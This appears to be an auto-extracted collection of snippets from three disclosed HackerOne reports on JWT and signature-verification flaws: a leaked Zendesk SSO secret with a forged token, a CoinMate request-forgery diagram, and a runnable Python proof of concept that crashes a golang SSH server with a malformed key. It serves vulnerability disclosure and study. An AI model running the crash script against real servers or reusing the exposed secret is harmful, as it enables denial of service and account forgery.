# JWT / signature verification — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #638635 Insecure Zendesk SSO implementation by generating JWT client-side — trint — - — Password in Configuration File
Source: `hackerone/reports/2019/638635.md` (https://hackerone.com/reports/638635)

```
[snip]
import { ZENDESK_DOMAIN } from 'modules/core/constants/index';

const { REACT_APP_ZENDESK_SECRET } = process.env;

[snip]

function RedirectToZendesk(props) {
  const { user, history } = props;

  function generateZendeskTokenAndRedirect() {
    const TIME_NOW_OBJECT = moment(Date.now());
    try {
      const payload = {
        iat: TIME_NOW_OBJECT.unix(),
        jti: uuid.v4(),
        name: `${user.profile.firstName} ${user.profile.lastName}`,
        email: user.username,
      };

      // encode zendesk token
      const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);
      window.location = `${ZENDESK_DOMAIN}/access/jwt?jwt=${zendeskToken}`;
    } catch (err) {
      history.push('/error');
    }
  }

  useEffect(
    () => {
      generateZendeskTokenAndRedirect(user);
    },
    [user],
  );

  return <Loader />;
}

[snip]

export default ZendeskLoadingPage;
```

```
var REACT_APP_ZENDESK_SECRET = "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ";
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NjI3MDk2NTksImp0aSI6IjIxZDAyOTg3LWU3YWItNDQ5MC05N2Q3LTc2YTBmMzJhOTVjOCIsIm5hbWUiOiJUZXN0IFRlc3QiLCJlbWFpbCI6ImIzODcxNjk0QHVyaGVuLmNvbSJ9.mnnx7dbpXbvU7xr5Bp5pad2eHVN01mSsXApmZoFj73c
```

## #3670955 HMAC signature verification omits endpoint and payload allowing request forgery on CoinMate API — coinmate — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2026/3670955.md` (https://hackerone.com/reports/3670955)

```
[Victim Device] -----> (Initiates: POST /api/balances with Signature X & Nonce 1) -----> [Attacker]
                                                                                             |
                                                                [Attacker DROPS the packet]
                                                                [Attacker HIJACKS Signature X]
                                                                [Attacker INJECTS 'sellLimit' parameters]
                                                                                             |
[Coinmate Database] <----- (Attacker Forges: POST /api/sellLimit with Signature X) <---------/
         |
[Coinmate verifies Signature X is mathematically valid]
[Coinmate executes the SELL ORDER based on the Attacker's forged parameters]
```

```
                                                                                             |
                                                                [Attacker DROPS the packet]
                                                                [Attacker HIJACKS Signature X]
                                                                [Attacker INJECTS 'sellLimit' parameters]
                                                                                             |
```

## #1276384 Signature Verification /// golang.org/x/crypto/ssh — sifchain — - — Cryptographic Issues - Generic
Source: `hackerone/reports/2021/1276384.md` (https://hackerone.com/reports/1276384)

```
# This should cause a panic on the remote server.
#

#!/usr/bin/env python

import socket
import sys

import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST

if len(sys.argv) != 4:
    print('./poc.py <host> <port> <user>')
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

t = paramiko.Transport(sock)
t.start_client()

t.lock.acquire()
m = paramiko.Message()
m.add_byte(cMSG_SERVICE_REQUEST)
m.add_string("ssh-userauth")
t._send_message(m)

m = paramiko.Message()
m.add_byte(cMSG_USERAUTH_REQUEST)
m.add_string(user)
m.add_string("ssh-connection")
m.add_string('publickey')
m.add_boolean(True)
m.add_string('ssh-ed25519')

# Send an SSH key that is too short (ed25519 keys are 32 bytes)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15key-that-is-too-short')

# Send an empty signature (the server won't get far enough to validate it)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

t._send_message(m)

print('Malformed auth request sent. This should cause a panic on the remote server.')
```

```
    print('./poc.py <host> <port> <user>')
    sys.exit(1)
```

